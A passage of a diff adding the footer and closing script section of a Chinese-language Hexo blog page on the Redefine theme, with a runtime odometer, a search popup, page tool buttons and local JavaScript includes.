+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
